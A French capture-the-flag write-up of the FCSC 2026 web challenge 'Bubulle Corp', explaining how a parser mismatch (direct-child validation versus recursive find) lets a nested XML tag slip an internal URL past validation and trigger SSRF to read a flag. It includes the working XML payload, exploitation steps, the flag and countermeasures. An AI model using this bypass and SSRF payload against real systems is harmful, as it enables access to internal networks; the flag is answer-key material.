# FCSC 2026 — Bubulle Corp (Part 1/2)

> **Catégorie :** Web  
> **Vulnérabilités :** Bypass de validation XML + SSRF  
> **Flag :** `FCSC{c22f014ba1aac9b3c487989156c470b0}`

---

## 1. Présentation du challenge

On nous donne accès à un site web d'entreprise fictif appelé **Bubulle Corp**, ainsi que le code source complet de l'application (déployable en local via Docker). L'objectif est de récupérer un flag caché dans l'infrastructure interne du serveur, totalement inaccessible depuis l'extérieur en conditions normales.

---

## 2. Architecture du site

L'application est composée de **trois services Docker** qui communiquent sur des réseaux privés séparés.

```
┌──────────────────────────────────────────────┐
│              RÉSEAU : dmz                    │
│                                              │
│  ┌─────────────────────┐                     │
│  │  public-frontend    │ ← port 8000          │
│  │  Flask / Python     │   accessible depuis  │
│  │  (notre cible)      │   Internet           │
│  └──────────┬──────────┘                     │
│             │ même réseau → peut joindre      │
│             ↓ internal-proxy directement      │
│  ┌─────────────────────┐                     │
│  │  internal-proxy     │ ← port 80            │
│  │  Apache HTTP        │   inaccessible       │
│  │  (contient le flag) │   depuis Internet    │
│  └──────────┬──────────┘                     │
│             │                                │
└─────────────┼────────────────────────────────┘
              │
┌─────────────┼────────────────────────────────┐
│             │    RÉSEAU : internal            │
│             ↓                                │
│  ┌─────────────────────┐                     │
│  │  internal-backend   │ ← port 5000          │
│  │  Flask / Python     │   inaccessible       │
│  └─────────────────────┘                     │
└──────────────────────────────────────────────┘
```

| Service | Technologie | Réseaux | Accessible depuis |
|---|---|---|---|
| `public-frontend` | Flask (Python) | dmz | Internet (port 8000) |
| `internal-proxy` | Apache HTTP | dmz + internal | Interne uniquement |
| `internal-backend` | Flask (Python) | internal | Interne uniquement |

> **Point clé :** `public-frontend` et `internal-proxy` sont sur le **même réseau DMZ**. Le frontend peut donc joindre le proxy via son hostname Docker : `bubulle-corp-internal-proxy`.

---

## 3. Fonctionnement détaillé du site

### 3.1 Le frontend (public-frontend)

C'est l'unique service visible depuis Internet. Il tourne avec Flask et expose plusieurs routes :

| Route | Rôle |
|---|---|
| `/register` | Création de compte |
| `/login` | Connexion |
| `/logout` | Déconnexion |
| `/` | Dashboard (page d'accueil connecté) |
| `/settings` | Configuration du profil en XML |
| `/icon` | Affiche l'icône/avatar de l'utilisateur |

**Base de données SQLite** — chaque utilisateur a une colonne `settings` contenant son XML de configuration :

```sql
CREATE TABLE users (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    settings TEXT DEFAULT '
        <settings>
            <icon_url>DEFAULT</icon_url>
            <method>GET</method>
        </settings>'
);
```

---

### 3.2 Pourquoi la photo de profil est configurée en XML ?

C'est le choix de conception (volontairement vulnérable) du challenge. Plutôt que d'uploader une image, l'utilisateur configure une **URL source** pour son avatar. Cette configuration est stockée au format XML et permet de définir :

- `<icon_url>` — l'URL de l'image à récupérer
- `<method>` — la méthode HTTP à utiliser (GET ou POST)
- `<body>` — un corps de requête optionnel (pour POST)

Quand on visite `/icon`, le serveur lit ce XML, extrait l'URL, et fait une **requête HTTP réelle** vers cette URL grâce à `pycurl`. La réponse est renvoyée directement au navigateur comme une image.

XML par défaut d'un nouvel utilisateur :

```xml
<settings>
    <icon_url>DEFAULT</icon_url>
    <method>GET</method>
</settings>
```

> Quand `icon_url` vaut `DEFAULT`, le serveur retourne simplement son logo local (un SVG de poisson-globe).

---

### 3.3 La validation dans `/settings` (routes.py)

Avant de sauvegarder le XML en base de données, le code effectue plusieurs contrôles de sécurité :

```python
from lxml import etree as ET

# 1. Parse le XML soumis par l'utilisateur
root = ET.fromstring(xml_data.encode())

# 2. La balise racine doit être <settings>
if root.tag != "settings":
    return error("Root element must be <settings>")

# 3. Les balises <icon_url> et <method> doivent exister
child_tags = [elem.tag for elem in root]  # liste des enfants DIRECTS
if "icon_url" not in child_tags:
    return error("Missing <icon_url>")
if "method" not in child_tags:
    return error("Missing <method>")

# 4. Validation de chaque enfant direct
for elem in list(root):

    # icon_url doit obligatoirement commencer par "https://"
    if elem.tag == "icon_url" and not elem.text.startswith("https://"):
        return error("Icon URL must start with https://")

    # method ne peut être que GET ou POST
    if elem.tag == "method" and elem.text not in ("GET", "POST"):
        return error("Method must be GET or POST")

    # Toute balise inconnue est supprimée de l'arbre
    if elem.tag not in ("icon_url", "method", "body"):
        root.remove(elem)

# 5. Sauvegarde du XML nettoyé en base
clean = ET.tostring(root, encoding="unicode")
db.execute("UPDATE users SET settings = ? WHERE id = ?", (clean, session["user_id"]))
```

**Balises autorisées comme enfants directs :** `icon_url`, `method`, `body`.

---

### 3.4 La récupération d'icône (icon.py)

Une fois le XML sauvegardé en base, la fonction `fetch_icon()` l'utilise pour faire la requête réelle :

```python
import pycurl
from lxml import etree as ET

def fetch_icon(settings_xml):
    root = ET.fromstring(settings_xml.encode())

    # Cherche icon_url dans TOUT l'arbre XML (profondeur d'abord)
    icon_url = root.find(".//icon_url").text
    method   = root.find(".//method").text
    body     = root.find(".//body").text if root.find(".//body") else None

    if icon_url == "DEFAULT":
        return (open("./app/static/blowfish.svg"), "image/svg+xml")

    buffer = io.BytesIO()
    c = pycurl.Curl()
    c.setopt(pycurl.URL, icon_url.encode("latin1"))       # URL encodée en latin1
    c.setopt(pycurl.CUSTOMREQUEST, method.encode("latin1"))
    c.setopt(pycurl.WRITEDATA, buffer)
    c.setopt(pycurl.TIMEOUT, 5)
    c.setopt(pycurl.SSL_VERIFYPEER, 0)                    # ignore les erreurs SSL
    c.setopt(pycurl.SSL_VERIFYHOST, 0)                    # ignore les erreurs SSL

    if body:
        c.setopt(pycurl.POSTFIELDS, body.encode("latin1"))

    c.perform()   # effectue la requête HTTP
    return (buffer.getvalue(), "image/png")
```

**Observations importantes :**
- `pycurl` fait une vraie requête HTTP vers n'importe quelle URL, **y compris des adresses internes**
- Les vérifications SSL sont désactivées (`SSL_VERIFYPEER=0`)
- Il n'y a aucune restriction sur la destination de la requête
- `FOLLOWLOCATION` n'est pas désactivé → pycurl **suit les redirections HTTP**

---

### 3.5 La configuration Apache de l'internal-proxy

C'est là que se trouve le flag. La configuration est la suivante :

```apache
HttpProtocolOptions Unsafe   # accepte des requêtes HTTP non-standard

<VirtualHost *:80>

    # RÈGLE CLÉ : toute URL avec un path non-vide → retourne /flag.txt
    AliasMatch "^/.+" "/flag.txt"

    # La racine "/" → proxifiée vers le backend Flask
    <Location "/">
        ProxyPass http://bubulle-corp-internal-backend:5000/
        ProxyPassReverse http://bubulle-corp-internal-backend:5000/
    </Location>

    # Toute sous-URL → le proxy est bloqué (AliasMatch prend le dessus)
    <LocationMatch "^/.+">
        ProxyPass "!"
        Require all granted
    </LocationMatch>

</VirtualHost>
```

**Ce que ça signifie concrètement :**

| Requête vers le proxy | Résultat |
|---|---|
| `GET /` | Proxifié vers le backend Flask |
| `GET /flag` | Retourne le contenu de `flag.txt` |
| `GET /n-importe-quoi` | Retourne le contenu de `flag.txt` |

Autrement dit : **toute requête HTTP vers ce proxy avec un path non-vide retourne directement le flag.**

---

## 4. Analyse des vulnérabilités

### 4.1 Vulnérabilité principale : SSRF (Server-Side Request Forgery)

`fetch_icon()` effectue une requête HTTP vers n'importe quelle URL fournie par l'utilisateur, sans vérifier si la destination est interne ou externe. Si on réussit à lui passer `http://bubulle-corp-internal-proxy/flag`, pycurl va interroger le serveur interne et retourner le contenu du flag.

> **SSRF — définition :** forcer un serveur à effectuer une requête HTTP vers une ressource choisie par l'attaquant, contournant ainsi les pare-feux et contrôles d'accès réseau.

**Le blocage en place :** la validation exige que `icon_url` commence par `https://`. On ne peut pas directement écrire `http://bubulle-corp-internal-proxy/flag`. De plus, même avec `https://`, pycurl échouerait sur le proxy interne qui n'a pas de certificat SSL.

---

### 4.2 Vulnérabilité secondaire : Bypass XML via `find('.//...')`

C'est **la vulnérabilité centrale** qui permet de contourner le check `https://`. Elle repose sur une différence de comportement entre deux façons de parcourir un arbre XML en Python/lxml.

**La validation** dans `routes.py` utilise une boucle `for` sur les enfants directs :

```python
for elem in list(root):
    # ne voit que les enfants DIRECTS de <settings>
    if elem.tag == "icon_url" and not elem.text.startswith("https://"):
        return error
```

**La récupération** dans `icon.py` utilise `find('.//icon_url')` :

```python
# './/icon_url' = cherche dans TOUT l'arbre, en profondeur d'abord
icon_url = root.find(".//icon_url").text
```

| Méthode | Ce qu'elle voit | Utilisée dans |
|---|---|---|
| `for elem in list(root)` | Enfants **directs** uniquement | `routes.py` — validation |
| `root.find('.//icon_url')` | **Tous** les éléments, profondeur d'abord | `icon.py` — fetch_icon |

**Le préfixe XPath `.//'` signifie :** "cherche récursivement dans tous les descendants". La méthode retourne le **premier** élément trouvé en parcourant l'arbre de haut en bas, de gauche à droite — donc un `<icon_url>` imbriqué dans `<body>` sera trouvé en **premier** si `<body>` apparaît avant `<icon_url>` dans le XML.

**Et `<body>` est une balise autorisée dont le contenu n'est pas validé.** On peut donc y imbriquer un `<icon_url>` avec une URL `http://` sans déclencher le check.

---

## 5. Exploitation

### 5.1 Création d'un compte

Se rendre sur `/register` et créer un compte en respectant les règles :

```
username : pwnduser1       (≥ 8 caractères)
password : Exploit1!       (majuscule + minuscule + caractère spécial)
```

---

### 5.2 Construction du payload XML

```xml
<settings>
  <body>
    <icon_url>http://bubulle-corp-internal-proxy/flag</icon_url>
  </body>
  <icon_url>https://legit</icon_url>
  <method>GET</method>
</settings>
```

**Analyse détaillée du payload :**

**Étape 1 — Parsing initial**
```
lxml parse le XML → arbre :
settings
├── body
│   └── icon_url  → "http://bubulle-corp-internal-proxy/flag"
├── icon_url      → "https://legit"
└── method        → "GET"
```

**Étape 2 — Validation `child_tags`**
```python
child_tags = [elem.tag for elem in root]
# → ['body', 'icon_url', 'method']
# ✅ 'icon_url' présent
# ✅ 'method' présent
```

**Étape 3 — Boucle de validation**
```python
for elem in list(root):
    # elem = <body>     → tag autorisé, pas de check sur son contenu ✅
    # elem = <icon_url> → text = "https://legit" → startswith("https://") ✅
    # elem = <method>   → text = "GET" → dans ("GET", "POST") ✅
# Rien n'est supprimé, tout passe !
```

**Étape 4 — Sauvegarde en base**
```xml
<!-- XML complet sauvegardé, y compris le <icon_url> imbriqué dans <body> -->
<settings>
  <body><icon_url>http://bubulle-corp-internal-proxy/flag</icon_url></body>
  <icon_url>https://legit</icon_url>
  <method>GET</method>
</settings>
```

**Étape 5 — fetch_icon() est appelée**
```python
icon_url = root.find(".//icon_url").text
# Parcours en profondeur : body → body/icon_url trouvé EN PREMIER
# → retourne "http://bubulle-corp-internal-proxy/flag"
```

**Étape 6 — pycurl fait la requête**
```
pycurl → GET http://bubulle-corp-internal-proxy/flag
Apache → AliasMatch "^/.+" → sert /flag.txt
Réponse → FCSC{...}
```

---

### 5.3 Soumission et déclenchement

1. Se connecter sur le site
2. Aller dans **Profile Settings**
3. Coller le payload XML dans le champ de configuration
4. Cliquer **Save Configuration**
5. Naviguer vers `/icon`

> **Astuce :** le endpoint `/icon` retourne la réponse avec `Content-Type: image/png`, donc le navigateur tente d'afficher une image et ne montre pas le texte. Pour voir le flag brut, utiliser `view-source:https://bubulle-corp.fcsc.fr/icon` ou consulter l'onglet **Network → Response** dans les DevTools (F12).

---

### 5.4 Résultat

```
FCSC{c22f014ba1aac9b3c487989156c470b0}
```

---

## 6. Schéma complet de l'attaque

```
Attaquant
    │
    │  1. POST /settings
    │     payload XML avec <body><icon_url>http://proxy/flag</icon_url></body>
    │                  et  <icon_url>https://legit</icon_url>
    ▼
public-frontend (Flask)
    │
    │  2. Validation : itère sur enfants directs
    │     → voit <icon_url>https://legit</icon_url> → OK ✅
    │     → <body> est autorisé, contenu ignoré ✅
    │     → XML sauvegardé en base avec le <icon_url> caché
    │
    │  3. GET /icon → fetch_icon() appelée
    │     → find('.//icon_url') parcourt en profondeur
    │     → trouve http://bubulle-corp-internal-proxy/flag EN PREMIER
    │
    │  4. pycurl → requête HTTP vers internal-proxy
    ▼
internal-proxy (Apache)
    │
    │  5. Reçoit GET /flag
    │     AliasMatch "^/.+" correspond → sert /flag.txt
    ▼
FCSC{c22f014ba1aac9b3c487989156c470b0} 🎉
```

---

## 7. Contre-mesures

### Corriger le bypass XML
Utiliser `root.find('icon_url')` sans `.//' dans `fetch_icon()` pour ne chercher que les enfants directs, cohérent avec la logique de validation :

```python
# Avant (vulnérable)
icon_url = root.find(".//icon_url").text   # cherche dans tout l'arbre

# Après (corrigé)
icon_url = root.find("icon_url").text      # cherche uniquement les enfants directs
```

### Corriger la SSRF
Mettre en place une allowlist de domaines autorisés, ou bloquer les plages d'IP privées (RFC 1918 : `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) avant d'effectuer la requête.

### Durcir la configuration Apache
Supprimer `HttpProtocolOptions Unsafe` et ne pas servir de fichiers sensibles directement via `AliasMatch`. Restreindre l'accès au proxy interne par IP plutôt que par configuration de routes.

